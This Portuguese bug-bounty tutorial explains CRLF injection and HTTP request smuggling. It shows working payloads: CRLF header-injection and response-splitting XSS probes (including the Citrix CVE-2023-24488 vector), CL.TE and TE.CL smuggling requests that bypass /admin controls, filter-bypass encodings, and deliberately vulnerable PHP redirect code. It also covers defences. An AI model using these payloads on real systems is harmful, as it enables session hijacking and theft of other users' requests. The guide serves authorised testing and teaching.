---
title: "CRLF Injection e HTTP Request Smuggling: quebrando o protocolo"
description: "Como abusar da forma que o HTTP é parseado — injetar headers com %0d%0a (CRLF) e dessincronizar front-end e back-end (request smuggling) — para envenenar respostas, burlar controles e capturar requests de outros usuários."
author: matheus
date: 2026-04-22 08:24:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["CRLF injection", "request smuggling", "HTTP desync", "response splitting", "OWASP", "bug bounty", "web security", "Burp Suite"]
image: /assets/img/covers/crlf-request-smuggling.png
pin: false
comments: true
---

## Quando uma quebra de linha vira a sua arma

O HTTP parece simples: você manda um texto, o servidor responde outro texto. Mas é justamente nessa simplicidade que mora o perigo. O protocolo é **delimitado por caracteres invisíveis** (uma quebra de linha aqui, uma sequência de bytes ali), e cada servidor, proxy, CDN e load balancer no caminho **interpreta esses delimitadores do seu jeito**. Quando dois deles discordam sobre "onde termina um header" ou "onde termina uma request", o atacante entra no meio e brinca de mestre de marionetes.

> 💡 **Proxy / CDN / load balancer**: intermediários que ficam entre você e o servidor de aplicação — recebem sua request, talvez filtram/cacheiam, e repassam pra trás (o "front-end" do post). Detalhe de proxy no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

Este post junta dois bugs que parecem distintos mas têm a **mesma raiz**: abusar de como o HTTP é parseado.

1. **CRLF Injection**: você injeta uma quebra de linha (`%0d%0a`) onde o servidor não esperava e passa a **escrever headers/conteúdo na resposta**.
2. **HTTP Request Smuggling** (também chamado de **HTTP desync**): você faz o front-end e o back-end **discordarem sobre onde sua request termina**, e "contrabandeia" uma request escondida dentro da outra.

CRLF é um ótimo bug de entrada (acessível, didático, paga de algumas centenas de reais). Request smuggling é um dos bugs mais **temidos e bem pagos** do mercado, e um dos que mais confundem. A meta aqui é deixar os dois **cristalinos**, sem saltos lógicos, pra você replicar em qualquer alvo autorizado.

## O que é, na real (a analogia do envelope)

Imagina que toda request HTTP é um **envelope** com regras rígidas de formatação. Cada **linha** termina com dois caracteres invisíveis: `\r\n` (carriage return + line feed, o famoso **CRLF**). Uma **linha em branco** (`\r\n\r\n`) marca o fim dos headers e o começo do corpo.

```
GET /perfil HTTP/1.1\r\n
Host: alvo.com\r\n
Cookie: sessao=abc\r\n
\r\n              <- linha em branco: acabaram os headers
```

Os dois bugs deste post exploram esses delimitadores:

- **CRLF Injection** é quando você consegue **inserir um `\r\n` no meio de um valor** que o servidor vai copiar pra dentro da resposta (tipicamente num header `Location` de redirect ou num header refletido). É como conseguir **escrever uma linha a mais no envelope de resposta** que o servidor está montando pra você. De repente você não está mais preenchendo *o valor* de um header — você está **criando um header novo** (ou até quebrando pro corpo da resposta).

- **HTTP Request Smuggling** acontece quando dois servidores no caminho **não concordam sobre onde sua request termina**. O HTTP/1.1 tem **duas formas** de dizer o tamanho do corpo: o header `Content-Length` (tamanho em bytes) e o `Transfer-Encoding: chunked` (corpo em pedaços). Se o front-end usa uma regra e o back-end usa outra, sobra um "pedaço" da sua mensagem que o back-end interpreta como **o início da próxima request**: a request de outra pessoa.

> **Analogia do smuggling:** é como passar por dois seguranças na fila do cinema. O primeiro (front-end) só lê o título do seu ingresso e libera. O segundo (back-end) conta as poltronas. Você forja o ingresso de um jeito que o primeiro vê "1 lugar" e o segundo vê "1 lugar + um bilhete extra colado atrás". O bilhete extra (sua request contrabandeada) entra **como se fosse legítimo**, porque o primeiro segurança já "aprovou".

## Por que isso importa (e quanto paga)

O impacto varia bastante entre os dois:

**CRLF Injection** sozinho costuma ser **Baixo a Médio**: você prova que injeta um header arbitrário na resposta. Mas o valor sobe rápido quando você **escala**:

- **Set-Cookie malicioso / session fixation**: injetar um `Set-Cookie` que fixa a sessão da vítima (você força um ID de sessão conhecido por você no navegador dela e depois reusa).
- **XSS via response splitting**: quebrar pro corpo da resposta e injetar HTML/JS (quando o navegador renderiza).
- **Open redirect / cache poisoning**: manipular `Location` e/ou envenenar cache (fazer o CDN guardar uma resposta maliciosa sua e servi-la pra outros usuários).

Faixa típica: de **R$150 a R$1.000** pra um CRLF refletido simples; mais se você escalar pra XSS ou poisoning.

**HTTP Request Smuggling** é outro patamar. Por afetar **todos os usuários** que passam pela mesma conexão, costuma ser **Alto a Crítico** e pagar **de milhares a dezenas de milhares de reais**:

- **Bypass de controles do front-end**: alcançar `/admin` que o front-end bloqueava.
- **Captura de requests de outros usuários**: roubar cookies/tokens de quem usa o site ao mesmo tempo que você.
- **Response queue poisoning**: embaralhar a fila de respostas e servir a resposta de A pro usuário B.
- **Escalar XSS/cache poisoning** pra base inteira de usuários, sem interação.

> ⚠️ **Cheque o escopo e teste com cuidado.** Smuggling pode **afetar usuários reais** (você pode envenenar a fila e derrubar requests legítimas). Muitos programas pedem cuidado redobrado; alguns proíbem testes agressivos de desync. Leia as regras antes.

> 💡 **Para dimensionar a severidade no report** (calcule sempre no [contexto do seu alvo](/posts/severidade-impacto-triagem/); os vetores abaixo são referência de um cenário comum):
>
> - **CRLF refletido (header injection, sem escalada confirmada)**: geralmente **Médio**.
>   - **CVSS v3.1: 6.1** (`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
>   - **CVSS v4.0: 5.3** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:L/SA:N`)
> - **HTTP Request Smuggling (captura de requests / response queue poisoning)**: geralmente **Alto a Crítico**.
>   - **CVSS v3.1: 8.7** (`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`)
>   - **CVSS v4.0: 9.4** (`CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`)
>
> O `AC:H` reflete que o ataque depende de uma **discrepância de parsing entre front-end e back-end** que você não controla (condição honesta de pontuar). Note como o v4.0 **sobe** em relação ao v3.1 aqui: ele pesa mais o **impacto em sistema subsequente** (SC/SI:H — outros usuários), enquanto o v3.1 amortecia via Scope.
>
> No v4.0 não existe mais o flag de Scope (`S`); o "salto" entre o componente vulnerável e o impactado é expresso pelas métricas **SC/SI/SA** (Subsequent System), o que encaixa bem em CRLF/smuggling, onde quem sofre o impacto costuma ser **outro usuário** ou o **cache/CDN**.

## Como funciona por trás

### CRLF: o servidor copia sua entrada pra dentro da resposta

O caso clássico é um parâmetro que vai parar num **header de resposta** sem sanitização. Pense num redirect:

```php
// VULNERÁVEL — joga a entrada do usuário direto no header Location
header("Location: /" . $_GET['url']);   // <- nenhuma validação de \r\n
```

Se você pede `?url=conta`, a resposta é:

```http
HTTP/1.1 302 Found
Location: /conta
```

Mas se você manda `?url=%0d%0aSet-Cookie:%20sessao=injetada`, o `%0d%0a` é decodificado pra `\r\n` **dentro do valor do Location**. A resposta vira:

```http
HTTP/1.1 302 Found
Location: /
Set-Cookie: sessao=injetada       # <- header que VOCÊ criou, não o servidor
```

Você não preencheu mais "o valor do Location" — você **iniciou uma nova linha de header**. Esse é o coração do CRLF: a quebra de linha que você injeta é **a mesma** que o servidor usa pra separar headers.

### Smuggling: Content-Length vs Transfer-Encoding

No HTTP/1.1, o corpo de uma request pode ser delimitado de **duas maneiras** ([RFC / PortSwigger](https://portswigger.net/web-security/request-smuggling)):

| Mecanismo | Como funciona |
|---|---|
| `Content-Length: N` | O corpo tem exatamente **N bytes**. |
| `Transfer-Encoding: chunked` | O corpo vem em **pedaços (chunks)**: cada chunk = tamanho em **hexadecimal** + `\r\n` + dados + `\r\n`. Um chunk de tamanho `0` encerra o corpo. |

A spec diz que, se os dois headers aparecem, o `Transfer-Encoding` **tem precedência** e o `Content-Length` deve ser ignorado. O problema: **nem todo servidor obedece**. E numa arquitetura típica (CDN/load balancer na frente, servidor de aplicação atrás), basta o front-end seguir uma regra e o back-end outra.

Lembrete de como é um corpo `chunked` válido:

```http
POST / HTTP/1.1
Host: alvo.com
Transfer-Encoding: chunked

b              # <- chunk de 0x0b = 11 bytes (em hexadecimal!)
hello world
0              # <- chunk de tamanho 0 encerra o corpo

```

> 💡 **O detalhe que todo mundo erra:** o tamanho do chunk é em **hexadecimal**, não decimal. `b` = 11 bytes. Errar isso é o motivo número 1 de "meu smuggling não funciona".

## Tipos e variações

### CRLF Injection

| Variação | Onde ocorre |
|---|---|
| **Header injection** | Sua entrada reflete num header de resposta (`Location`, header customizado, `Set-Cookie`). |
| **HTTP Response Splitting** | Dois CRLFs (`%0d%0a%0d%0a`) fecham os headers e te jogam **pro corpo** — dá pra injetar HTML/JS. |
| **Set-Cookie injection** | Injetar um cookie (fixation / sobrescrever flags). |
| **Log injection** | A entrada vai pra um log multi-linha — forja entradas falsas. |

### HTTP Request Smuggling

A nomenclatura é **`[front-end].[back-end]`** — qual header cada um obedece:

| Variante | Front-end usa | Back-end usa | Ideia |
|---|---|---|---|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` | Front conta bytes; back lê chunks. |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` | Front lê chunks; back conta bytes. |
| **TE.TE** | `Transfer-Encoding` | `Transfer-Encoding` | Ambos suportam TE, mas você **ofusca** o header (`Transfer-Encoding:\tchunked`, espaços, duplicação) pra que **um** deles ignore. |
| **H2.CL / H2.TE** | HTTP/2 (length nativo) | HTTP/1.1 (CL ou TE) | Surge no **downgrade** de HTTP/2 → HTTP/1.1 (mais abaixo). |

## Recon — como encontrar

### Caçando CRLF

Procure **todo lugar onde sua entrada pode acabar num header de resposta**:

- **Redirects**: parâmetros tipo `?url=`, `?redirect=`, `?next=`, `?returnTo=`, `?post_logout_redirect_uri=`. O valor costuma ir pro `Location`.
- **Headers refletidos**: às vezes um parâmetro reflete num header customizado.
- **Path e query**: alguns servidores refletem partes da URL em headers.

Junte URLs e parâmetros com as ferramentas de recon (já vimos isso a fundo no post [Recon & Discovery](/posts/recon-discovery/)) e injete o probe em cada um:

```bash
# gau lista URLs históricas; httpx valida quais respondem.
echo alvo.com | gau | grep -Ei 'url=|redirect=|next=|return' | httpx -mc 200,301,302
```

O **probe de CRLF** é simples: injete um header marcador e veja se ele aparece na resposta.

```
/%0d%0aMeuHeader:injetado        # se "MeuHeader: injetado" voltar na resposta -> CRLF
```

> 💡 **Dica:** sempre olhe a resposta no modo **Raw** do Burp, não no Pretty. O CRLF é sobre os bytes brutos da resposta — o Pretty pode mascarar a quebra de linha que você injetou.

### Caçando Smuggling

Aqui o sinal é **timing (atraso)**, não conteúdo refletido. Você manda uma request maliciosa e mede se o servidor **trava esperando bytes que nunca vêm**. Ferramenta certa:

- **HTTP Request Smuggler**: extensão oficial do Burp (BApp Store), escrita pelo **James Kettle** (PortSwigger), que automatiza a [detecção por timing](https://github.com/PortSwigger/http-request-smuggler) de CL.TE, TE.CL, TE.TE, desync de downgrade HTTP/2 e mais. Clica com o botão direito na request → *Extensions → HTTP Request Smuggler → Smuggle probe*.

Mais sobre as ferramentas básicas (gau, httpx, Burp) está no post [Recon & Discovery](/posts/recon-discovery/).

## Exploração passo a passo (do básico ao avançado)

### CRLF — Nível 1: injetar um header

No Repeater, pegue um endpoint de redirect e injete o marcador:

```http
GET /redirect?url=%0d%0aX-Injetado:%20PoC HTTP/1.1
Host: alvo.com
```

Se a resposta contiver:

```http
HTTP/1.1 302 Found
Location: 
X-Injetado: PoC            # <- header injetado: CRLF confirmado
```

CRLF confirmado. (Se o `%0d%0a` não passar, tente variações: `%0D%0A`, `%E5%98%8A%E5%98%8D` (bytes Unicode que alguns parsers normalizam pra CRLF), ou só `%0a`.)

### CRLF — Nível 2: response splitting → XSS

Dois CRLFs **fecham os headers** e te levam pro corpo. Se o navegador renderizar como HTML, vira XSS refletido:

```http
GET /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script> HTTP/1.1
Host: alvo.com
```

A resposta resultante:

```http
HTTP/1.1 302 Found
Location: 

<script>alert(document.domain)</script>   # <- corpo controlado pelo atacante
```

> Esse mecanismo é o mesmo do **CVE-2023-24488** (Citrix ADC / Gateway): o parâmetro `post_logout_redirect_uri` do endpoint `/oauth/idp/logout` refletia a entrada no `Location` sem filtrar CRLF, permitindo quebrar pro corpo e executar JS. A PoC pública usava um payload no estilo `?post_logout_redirect_uri=%0D%0A%0D%0A<body onload=alert(document.domain)>` (o `<script>` acima é a versão didática; o vetor é idêntico). Referência oficial: [Citrix CTX477714](https://support.citrix.com/article/CTX477714). CVSS atribuído ao CVE (NVD): **v3.0 6.1** (`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`, Médio — o vetor base é idêntico ao 3.1). (XSS a fundo já tem post próprio na série — aqui é só pra mostrar a **escalada** do CRLF.)

### Smuggling — Nível 3: detecção por timing (CL.TE)

A request de detecção CL.TE ([PortSwigger](https://portswigger.net/web-security/request-smuggling/finding)):

```http
POST / HTTP/1.1
Host: alvo.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**O que acontece, byte a byte:**
- O corpo (depois da linha em branco) é `1\r\nA\r\nX`, onde `1` é o tamanho do chunk (1 byte, em hexadecimal) e `A` é o conteúdo desse chunk.
- O **front-end** obedece o `Content-Length: 4` → encaminha só os **4 primeiros bytes** do corpo: `1`, `\r`, `\n`, `A` (ou seja, `1\r\nA`). O `\r\nX` que sobra **não é encaminhado**.
- O **back-end** obedece o `Transfer-Encoding: chunked` → lê o chunk de 1 byte (`A`), e como **não viu um chunk terminador `0`**, **fica esperando o próximo chunk** que nunca chega.
- Resultado: **atraso observável**. O back-end trava esperando bytes que o front-end reteve. Isso indica CL.TE.

> ⚠️ Use `Content-Length: 4` na detecção (e **não** envie o `0` terminador) justamente pra travar o back-end. É o atraso que confirma o bug. Faça isso na extensão pra não derrubar conexões reais.

### Smuggling — Nível 4: explorando CL.TE pra burlar o front-end

Agora a versão que **acessa `/admin`** que o front-end bloqueava ([PortSwigger](https://portswigger.net/web-security/request-smuggling/exploiting)):

```http
POST /home HTTP/1.1
Host: alvo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: alvo.com
Foo: x
```

**Passo a passo:**
- O **front-end** usa `Content-Length: 48` → vê tudo (incluindo o `GET /admin`) como **um único corpo** da request pra `/home` (que é permitida) e encaminha.
- O **back-end** usa `Transfer-Encoding: chunked` → lê o chunk `0` (terminador) e considera a request `/home` **encerrada ali**. O resto (`GET /admin ...`) sobra no buffer e é tratado como **a próxima request**.
- Como essa "próxima request" já passou pelo front-end, o back-end **assume que ela foi autorizada** e serve `/admin`.

> O `Content-Length` precisa bater **exatamente** com o tamanho do corpo que o front-end enxerga — ou seja, **tudo a partir do `0`**, incluindo o `0\r\n\r\n` e a request escondida (lembre: cada quebra de linha conta como 2 bytes, `\r\n`). Aqui `0\r\n\r\nGET /admin HTTP/1.1\r\nHost: alvo.com\r\nFoo: x` = **48 bytes**. (No lab da PortSwigger, com o host `vulnerable-website.com`, esse mesmo cálculo dá `62`.) Erre por um byte e o ataque falha.

### Smuggling — Nível 5: TE.CL

O espelho. Aqui o front-end lê chunks e o back-end conta bytes ([PortSwigger](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)):

```http
POST / HTTP/1.1
Host: alvo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

- `71` é o tamanho do chunk em **hexadecimal** (= 113 bytes): tudo do `POST /admin` até o `x=1`.
- O **front-end** (TE) lê esse chunk de 113 bytes, depois o chunk `0`, e encaminha tudo.
- O **back-end** (CL) obedece o `Content-Length: 4` → consome só `71\r\n`, e o `POST /admin...` sobra como **request seguinte**.

> ⚠️ **Configuração no Burp Repeater (essencial pra TE.CL):** desmarque a opção **"Update Content-Length"** (menu do Repeater), senão o Burp recalcula o `Content-Length` e quebra o ataque. E garanta o `\r\n\r\n` final depois do `0`.

### Smuggling — Nível 6: HTTP/2 downgrade (a fronteira moderna)

O HTTP/2 **deveria** matar o smuggling: ele tem um mecanismo de tamanho **embutido e binário**, sem depender de CL/TE. O problema é o **downgrade**: muitos front-ends falam HTTP/2 com o cliente, mas **traduzem pra HTTP/1.1** ao falar com o back-end. Nessa tradução, o front-end **reconstrói** os headers `Content-Length`/`Transfer-Encoding`. Se você injetou valores conflitantes nos headers do HTTP/2, o back-end downgrade pode ser dessincronizado. São as variantes **H2.CL** e **H2.TE**, da pesquisa [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2) (James Kettle). Por isso a defesa moderna é **HTTP/2 fim-a-fim** (sem downgrade no caminho).

## Caso real-fictício: CRLF refletido num servidor de pacotes interno

> Cenário **fictício, baseado em padrões reais** de programas de bug bounty (anonimizado).

Você está testando `repo.exemplo.com`, um servidor de pacotes (estilo PyPI server, atrás de um nginx/openresty). Ao acessar um path qualquer, o servidor responde com um redirect `301`. Você suspeita que o **path reflete em algum header**.

**Passo 1 — Probe.** No Repeater, injeta o marcador CRLF direto no path:

```http
GET /%0d%0aX-PoC-Cookie:injetado HTTP/2
Host: repo.exemplo.com
```

**Passo 2 — Confirmar.** A resposta (modo **Raw**):

```http
HTTP/2 301 Moved Permanently
Server: openresty
Location: https://repo.exemplo.com/
X-PoC-Cookie: injetado            # <- header injetado por você: CRLF confirmado
Content-Type: text/html
```

O `%0d%0a` quebrou a linha e o `X-PoC-Cookie: injetado` virou um **header de resposta arbitrário**. CRLF Injection confirmado num `301`.

**Passo 3 — Tentar escalar.** Você testa response splitting (`%0d%0a%0d%0a<script>...`) pra virar XSS. Nesse alvo o navegador **não renderiza** (o `Content-Type` e o contexto não ajudam), então a escalada pra XSS **não vai**. Sem problema: você reporta o **CRLF/header injection** com o impacto que **realmente** existe (injeção de header arbitrário, com potencial pra `Set-Cookie`/poisoning).

**O que a tela do Burp mostraria:** painel Request/Response lado a lado; na Request (Raw) o path `/%0d%0aX-PoC-Cookie:injetado` destacado; na Response (Raw) o header `X-PoC-Cookie: injetado` presente entre os headers do `301`.

**Passo 4 — Report.** Título `[CRLF Injection] - Injeção de header HTTP arbitrário via %0d%0a no path`. Resumo honesto: *"é possível injetar headers HTTP arbitrários na resposta; tentativas de escalar pra XSS não tiveram sucesso neste contexto, mas o vetor permite manipulação de headers (ex.: Set-Cookie)"*. Severidade **Média** (CVSS **v3.1 6.1** / **v4.0 5.3** — header injection refletido, sem escalada confirmada neste contexto). Faixa típica desse tipo de achado: **R$150–R$500**. (Como estruturar isso no post [Como escrever um report que paga](/posts/como-escrever-report-que-paga/), e severidade em [Severidade e impacto](/posts/severidade-impacto-triagem/).)

## Defesa em camadas

### Contra CRLF

A regra de ouro: **nunca** coloque entrada do usuário num header de resposta sem **rejeitar/encodar `\r` e `\n`**.

```php
// ERRADO — entrada vai direto pro header
header("Location: " . $_GET['url']);

// CORRETO — rejeita qualquer CR/LF antes de usar
$url = (string) $_GET['url'];
if (preg_match('/[\r\n]/', $url)) {
    http_response_code(400);
    exit('entrada inválida');
}
// melhor ainda: valide contra uma allowlist de destinos
header("Location: " . filter_var($url, FILTER_SANITIZE_URL));
```

```javascript
// Node — recuse CR/LF e use APIs que sanitizam headers.
// Em Node moderno, res.setHeader já lança erro com \r ou \n no valor,
// mas valide você também (defesa em profundidade):
if (/[\r\n]/.test(input)) return res.status(400).end('invalid');
res.setHeader('Location', encodeURI(input));
```

- **Use a API de redirect do framework** (que sanitiza) em vez de montar o header na mão.
- **Allowlist de URLs de redirect** mata CRLF *e* open redirect de uma vez.

### Contra Request Smuggling

A causa é **ambiguidade entre servidores**. As defesas:

1. **HTTP/2 fim-a-fim, sem downgrade.** A defesa mais sólida. Sem a ginástica CL/TE, o vetor clássico evapora.
2. **Normalizar/rejeitar requests ambíguas no front-end.** Se uma request tem **`Content-Length` e `Transfer-Encoding` ao mesmo tempo**, o front-end deve **rejeitar (400)** ou normalizar antes de encaminhar. Idem pra `Transfer-Encoding` ofuscado.

   ```nginx
   # Exemplo conceitual: bloquear requests com ambos os headers ambíguos.
   # (a defesa real depende do produto; muitos WAFs/proxies têm flag de
   #  "reject ambiguous requests" — habilite-a)
   ```

   > 💡 **WAF** é o Web Application Firewall: um filtro que inspeciona requests e bloqueia padrões maliciosos antes de chegarem na aplicação. Detalhe no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

3. **Front-end e back-end com o MESMO servidor/regra.** Quanto mais homogêneo o stack, menor a chance de desync. Mantenha proxies e servidores **atualizados** (muitas correções de desync vêm em patches).
4. **Desabilitar reuso de conexão back-end** mitiga (não elimina) alguns ataques, com custo de performance.

> ❌ **O que NÃO basta:** filtrar só `<script>` (não resolve nem CRLF nem smuggling); confiar que "o front-end já validou" (é exatamente o que o smuggling abusa); achar que HTTP/2 te protege se você faz **downgrade** no caminho.

## Ferramentas + labs legais

- **Burp Suite**: Repeater (com **"Update Content-Length" desmarcado** pra TE.CL), e a extensão **HTTP Request Smuggler** (detecção/automação por timing).
- **PortSwigger Web Security Academy**: labs gratuitos e oficiais de [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling) e de CRLF/response splitting. A melhor fonte pra treinar.
- **smuggler.py** (defparam) e **h2csmuggler**: scripts auxiliares pra detecção (use só em alvos autorizados).
- **DVWA / labs próprios** pra praticar CRLF sem risco.

## Checklist do caçador

- [ ] Mapeei todo parâmetro que pode refletir em header (`url=`, `redirect=`, `next=`, `post_logout_redirect_uri`...).
- [ ] Testei `%0d%0a`, `%0D%0A`, `%0a` e bytes Unicode (`%E5%98%8A%E5%98%8D`) no probe de CRLF.
- [ ] Olhei a resposta em **Raw** (não Pretty) pra ver o header injetado.
- [ ] Tentei escalar CRLF: `Set-Cookie`, dois CRLFs pro corpo (response splitting → XSS), cache poisoning.
- [ ] Rodei o **HTTP Request Smuggler** (Smuggle probe) nos endpoints POST.
- [ ] Confirmei smuggling por **timing** (atraso) antes de explorar.
- [ ] Lembrei: chunk size é **hexadecimal**; `Content-Length` conta `\r\n` como 2 bytes.
- [ ] Em TE.CL, **desmarquei "Update Content-Length"** no Repeater.
- [ ] Testei se há **downgrade HTTP/2 → HTTP/1.1** (H2.CL / H2.TE).
- [ ] Conferi o **escopo** e testei smuggling com cuidado (afeta outros usuários).

## Pegadinhas / o que NÃO funciona

- **Chunk size em decimal.** `11\r\nhello world` está **errado** — o tamanho é hexadecimal (`b`). Erro nº 1 de quem começa.
- **Esquecer que CRLF é 2 bytes.** Ao calcular `Content-Length` no smuggling, cada `\r\n` conta **2 bytes**. Conta errada = ataque morto.
- **Deixar o Burp recalcular o Content-Length.** Em TE.CL, se "Update Content-Length" estiver marcado, o Burp **conserta** seu payload malicioso. Desmarque.
- **Testar no Pretty view.** O Pretty do Burp normaliza/oculta CRLF. Sempre Raw.
- **Achar que `301`/`302` não dá XSS.** O CRLF pode injetar header mesmo num redirect; a escalada pra XSS **depende do contexto** (Content-Type, render do browser). Às vezes não vai, e tudo bem reportar só a injeção de header.
- **Smuggling "às cegas".** Mandar payloads de exploração sem confirmar por timing primeiro pode **derrubar requests de usuários reais**. Confirme, depois explore com responsabilidade.

## O que você precisa lembrar

- **Mesma raiz:** os dois bugs abusam de **como o HTTP é parseado**, ou seja, delimitadores invisíveis (`\r\n`) e ambiguidade de tamanho (CL vs TE).
- **CRLF Injection** = você injeta `%0d%0a` e **escreve headers/conteúdo** na resposta. Escala pra Set-Cookie, response splitting (XSS) e poisoning.
- **Request Smuggling** = front-end e back-end **discordam onde sua request termina**. Variantes **CL.TE / TE.CL / TE.TE** (e **H2.CL/H2.TE** no downgrade).
- **Detecção:** CRLF por **reflexo de header**; smuggling por **timing**.
- **Defesa:** rejeitar `\r\n` em headers (CRLF); **HTTP/2 fim-a-fim** + rejeitar requests ambíguas (smuggling).

> 💡 **Dica de ouro:** sempre que sua entrada toca um **header** (resposta) ou o **delimitador de tamanho** de uma request, pergunte *"o que acontece se eu colocar uma quebra de linha aqui?"*. Confirme **CRLF por reflexo** e **smuggling por timing** — nunca chute. E no smuggling, conte os bytes na mão: o `\r\n` invisível é onde o ataque vive ou morre.

## Nota ética

Tudo aqui é pra **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. Request smuggling é especialmente sensível: um teste mal feito pode **dessincronizar conexões de usuários reais** e causar indisponibilidade. Confirme por timing, explore com parcimônia, e nunca rode contra alvos sem permissão. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [PortSwigger — HTTP request smuggling (tutorial & examples)](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — Finding HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
- [PortSwigger — Exploiting HTTP request smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)
- [PortSwigger Research — HTTP/2: The Sequel is Always Worse (James Kettle)](https://portswigger.net/research/http2)
- [HTTP Request Smuggler — extensão do Burp (GitHub)](https://github.com/PortSwigger/http-request-smuggler)
- [OWASP — CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [OWASP — HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [Citrix CTX477714 — CVE-2023-24488 (Gateway XSS via CRLF)](https://support.citrix.com/article/CTX477714)

---
*Próximo/relacionado na série: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) · base: [Recon & Discovery](/posts/recon-discovery/) · severidade: [Severidade e impacto](/posts/severidade-impacto-triagem/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
